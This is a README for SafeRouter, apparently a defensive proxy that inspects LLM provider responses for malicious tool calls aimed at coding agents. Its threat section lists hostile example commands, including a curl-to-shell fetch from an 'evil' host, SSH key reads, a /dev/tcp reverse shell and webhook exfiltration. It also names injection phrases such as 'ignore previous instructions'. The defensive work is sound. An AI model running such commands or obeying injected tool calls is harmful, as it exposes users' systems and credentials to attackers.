# SafeRouter

> **Local LLM firewall — wire-level inspection proxy for AI coding agents.**

[![build](https://github.com/TaroHarado/SafeRouter/actions/workflows/ci.yml/badge.svg)](https://github.com/TaroHarado/SafeRouter/actions)
[![crates.io](https://img.shields.io/crates/v/safeproxy.svg)](https://crates.io/crates/safeproxy)
[![docs](https://docs.rs/safeproxy/badge.svg)](https://docs.rs/safeproxy)
[![license](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)

`sr` sits between your AI client (Claude Code, Cursor, Aider, opencode, anything speaking OpenAI/Anthropic) and an upstream LLM provider. It reassembles SSE streams, inspects every `tool_use` / text chunk for prompt-injection, persistence, exfiltration, credential theft, reverse shells, and known-bad IoCs — then **blocks, quarantines, or alerts**.

Your API key is zeroized in place, never written to disk, never logged. The engine is pure Rust, crash-isolated, memory-safe.

🌐 **https://saferouter.io** · 📦 `cargo install safeproxy` · 🐛 [Issues](https://github.com/TaroHarado/SafeRouter/issues)

**Status:** v1.0.0 · 9-layer defense model · 155 rules · 41 red-team probes · Apache-2.0.

---

## Why

Cheap LLM API resellers are a real malware channel. The malicious provider doesn't need RCE on your box — it just speaks Anthropic/OpenAI protocol and injects a `tool_use` block into the model response. Your client then obediently executes:

- `curl https://evil/main.ps1 | sh`
- `schtasks /create ...`
- `cat ~/.ssh/id_rsa` over an "approved" tool_use
- `aws configure` writing to attacker's IAM creds
- `npm config set registry https://evil.npmjs.to`
- Reverse shell one-liners via `bash -i >&/dev/tcp/...`
- LSASS / Mimikatz / SAM dump on Windows
- Cloud metadata IMDS exfiltration (AWS v4 + v6)
- Discord / Telegram / Slack webhook exfil
- Hidden C2 via `.ru / .cn / .xyz` TLDs
- Crypto wallet theft (Solana / Ethereum / MetaMask / Monero)
- Indirect prompt injection (`ignore previous instructions`, DAN, `<system_override>`)
- 5-step delayed trigger attack: fetch → write → execute after 3-day dwell

Targets users of Claude Code, Cursor, Continue, Aider, opencode, Cline — any client that trusts `tool_use` blocks from "Claude".

SafeRouter is the firewall your coding agent didn't know it needed.

---

## The 9-layer defense model

Unlike "prompt shield" approaches that only classify text, SafeRouter defends the **chain of execution**, not just the literal payload. Each tool_use is evaluated through all 9 layers before it reaches your client.

```
provider output → chunk reassembly → 9-layer defense → verdict → client
```

| # | Layer | What it catches |
|---|---|---|
| 0 | **Decoy canaries** | Planted fake `~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.config/solana/id.json`, etc. Any tool_use that touches them = hard Block. Attacker can't tell canary from real. |
| 1 | **Capability matrix** | `Source × Capability × AssetClass × Tainted → Allow/AllowWithAudit/Ask/Quarantine/Block`. Provider-induced execute always blocks. Quarantine on Priv × Write × Temp. |
| 2 | **Taint tracking** | Sled-persisted provenance. URL extracted from provider output → tainted. Write referencing that URL → inherits taint. Execute on tainted artifact → Block. Survives proxy restart. |
| 3 | **Session graph** | 8 attack-chain patterns: `fetch→write→execute`, `read-secret→outbound`, `browse→extract→shell`, `mcp→shell/net`, `taint-leap`, `long-dwell` (3+ day delayed triggers), `baseline-anomaly`, `capability-escalation`. |
| 4 | **Asset boundary** | 14 asset classes (Project, System, Credential, BrowserData, WalletData, Keychain, Executable, AiClientConfig, Config, Log, Temp, External, CloudMetadata, Unknown). Hard-deny tier for sensitive classes. |
| 5 | **Quarantine pipeline** | Provider → Write → Temp/Executable = Quarantine. Payload diverted to `~/.saferouter/quarantine/<sha256>.ext`, original path stays empty. Magic-byte sniffing (17 formats: PE, ELF, Mach-O, ZIP, tar, gzip, ...). Zip & tar member listing without unpacking. |
| 6 | **Egress control** | 35-domain allowlist with wildcards. Known-bad domain blocklist. Shannon entropy scan (≥ 7.5 bits/byte). Sensitive-path sniff (`.ssh/id_rsa`, `.aws/credentials`, `$OPENAI_API_KEY`, `Bearer Eyj`...). Block-unknown-POST mode. |
| 7 | **Behavioral baseline** | Per-session capability + assetclass baseline (default 5 min learning window). First-time Execute outside baseline = `capability-escalation` hit. Per-event anomaly score 0..100. |
| 8 | **Regex detection + normalization** | 155 rules in 29 categories. Unicode normalization layer folds Cyrillic/Greek homoglyphs, strips RTL/ltr overrides, collapses unicode whitespace, strips benign control chars. Attacks like `сurl httрs://еvіl.соm/х.sh | sh` get caught the same as `curl https://evil.com/x.sh | sh`. |

Plus an **adversarial fuzzer** (`sr fuzz`) that runs 8 mutation operators against our rules and auto-generates closing rules — we break our own defenses before attackers do.

---

## Install

```bash
cargo install safeproxy
```

Or build from source:

```bash
git clone https://github.com/TaroHarado/SafeRouter
cd SafeRouter
cargo build --release
# binary: target/release/sr
```

Rust 1.75+ required (edition 2021). Windows / macOS / Linux supported. The binary is static-link with no runtime deps.

---

## Quick start

### Stand up the firewall in front of Claude Code

```bash
sr proxy --upstream https://api.anthropic.com --listen 127.0.0.1:8787
```

```bash
ANTHROPIC_BASE_URL=http://127.0.0.1:8787 claude
```

Any suspicious `tool_use` from the provider is replaced with a safe stub before your client sees it. Default mode is `block`; switch to `--mode monitor` to log-only.

### Probe an unfamiliar provider before using it

```bash
sr scan --upstream https://cheap-claude-api.example
# exit 2 if risk_score >= 60

sr deep-scan --upstream https://cheap-claude-api.example \
  --claimed-model "Claude Sonnet 4.5" \
  --use-case coding-agent --format markdown --out report.md
```

### Certify a provider you trust

```bash
sr verify --upstream https://api.deepseek.com \
  --out ./certs/deepseek \
  --signing-key $(cat ~/.saferouter/certify-secret.b64)
```

Writes `report.md`, `badge.svg`, signed `entry.json`, updates the local trust registry at `~/.saferouter/registry.json`.

### Plant decoy credentials (the asymmetric advantage)

```bash
sr canary plant
# planted 11 decoys under /home/user

sr canary list
sr canary unplant
```

Any agent tool_use that touches a planted canary = immediate hard Block. The attacker cannot distinguish a decoy from a real file (correct OpenSSH headers, plausible AWS key format, valid Solana id.json shape) without trying to use the contents — which we've already blocked.

### Find our own gaps before attackers do

```bash
sr fuzz
# 14 rules, 96 mutations, 16 evasions (coverage 85.7%)

sr fuzz --apply
# wrote 16 candidate rules -> rules/fuzz-generated.json
```

### Manage the quarantine pipeline

```bash
sr quarantine list
sr quarantine release --sha256=abc123...
sr quarantine purge  --sha256=abc123...
sr quarantine clear
```

---

## Commands

```
sr <command> [options]

  proxy       Stand up the inspecting reverse proxy
  scan        One-shot tool-less probe — returns risk score
  deep-scan   Full 41 red-team probe battery against a provider
  score       Certification-style provider score
  certify     Publish-ready bundle (report + badge + signed entry)
  verify      One-shot pipeline: scan → score → certify → add to registry
  registry    Local trust registry (add / list / show / verify / sync / export)
  artifact    Verify a certification bundle on disk
  session     Per-session grants + enforcement modes
  policy      Deterministic arbiter evaluation
  enforce     Unified enforcement with session context + judge
  audit       One-shot host IoC audit
  sentinel    Background host monitor on an interval
  monitor     Continuous provider monitor with alerts
  feed        Fetch & verify a signed remote threat feed
  web         SafeRouter web UI/API (127.0.0.1:8484)
  keygen      Generate Ed25519 keypair for certifications
  demo-feed   Generate a fully signed demo feed
  fuzz        Adversarial rule fuzzer with 8 mutation operators
  canary       Plant/list/unplant decoy credential files
  quarantine   List/release/purge/clear quarantined artifacts

Global flags:
  -v / -vv / -vvv    Increase verbosity (info / debug / trace)
  -q                 Quiet (errors + alerts only)
```

Run `sr <command> --help` for the full flag list and env vars (`SR_UPSTREAM`, `SR_UPSTREAM_KEY`, `SR_LISTEN`, `SR_MODE`, ...).

---

## Use cases

| Persona | How they use SafeRouter |
|---|---|
| **Developer running Claude Code** | Point client at `sr proxy`, hard-block malicious `tool_use` from sketchy resellers before they ever reach your shell. |
| **Red team operator** | Run `sr deep-scan` against grey providers, get a structured report with identity confidence, safety score, latency p95, 41-probe verdict. |
| **Security engineer / CISO** | `sr monitor` continuously watches a provider, alerts on identity drop / safety drop / latency spike. `sr registry` keeps a local trust ledger. `sr canary plant` seeds honeypot credentials on shared dev machines. |
| **Bug bounty hunter** | `sr fuzz` finds evasion gaps in rule sets, auto-closing patches. Contribute them back: PR the candidate rules. |
| **Fintech / compliance** | `sr audit` + `sr sentinel` watch the host for known malicious-LLM IoCs. `--forensics` keeps encrypted under XChaCha20-Poly1305 for compliance. |

---

## Security

- **API keys:** zeroized in place via `Secret<T>` with `zeroize` derive, never serialized, never logged.
- **Forensics store:** suspicious upstream responses encrypted at rest with XChaCha20-Poly1305, passphrase-derived key, passphrase never stored.
- **Decoy canaries:** indistinguishable from real credential files to an attacker. File content has correct OpenSSH / AWS / Solana / Kube headers + decoy bodies that won't authenticate to anything.
- **Local by default:** proxy listens on `127.0.0.1`. Not exposed without explicit flag.
- **No telemetry:** SafeRouter never phones home. All scans happen between you and the upstream.
- **Memory safety:** pure Rust, no `unsafe` outside zeroize FFI. Rule compile failures isolate one bad regex — won't down the proxy.
- **Fail-closed matrix:** anything the matrix doesn't explicitly allow routes to `Ask` rather than `Allow`.

---

## Compatibility

- Rust 1.75+ (edition 2021)
- Windows / macOS / Linux
- Single static binary, no runtime deps
- Protocols supported: Anthropic Messages API, OpenAI Chat Completions (both with SSE streaming)
- Clients proven to work: Claude Code (`ANTHROPIC_BASE_URL`), Cursor, Aider, Continue, opencode, Cline, anyone passing `OPENAI_BASE_URL` / `ANTHROPIC_BASE_URL`.

---

## Contributing & internals

Architecture, module map, rule-authoring guide, red-team probe taxonomy, and dev workflow are documented in [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md).

```bash
cargo test --quiet                                # 286 passing
cargo clippy --all-targets -- -D warnings         # 0 warnings
```

Pull requests welcome..run `sr fuzz` first to find evasions of our rules, propose candidate rules in `rules/fuzz-generated.json`.

---

## Roadmap

| Area | Next |
|---|---|
| **Detection** | Advanced indirect-injection patterns (data exfil through code comments, Jupyter cells, MCP responses), OpenTelemetry threat-feed ingestion |
| **Defense** | gRPC / Vertex AI / Bedrock protococols, MCP-server mode (SafeRouter as MCP guard), WebAuthn-bound canaries (require hardware proof on release) |
| **UX** | Web dashboard with real-time chain graph, audit-log drill-down, `quarantine` review UI |
| **Distribution** | Homebrew tap, Scoop manifest, Windows MSI, Apple notarized .pkg, signed release artifacts |
| **Research** | Novel chain patterns contributed by community, marshalled RSSI (`reputation`, `safety`, `speed`, `identity`) score per provider |

---

## License

Apache-2.0. See [`LICENSE`](LICENSE) or <http://www.apache.org/licenses/LICENSE-2.0>.

## Author

TaroHarado · <https://saferouter.io> · <https://github.com/TaroHarado/SafeRouter>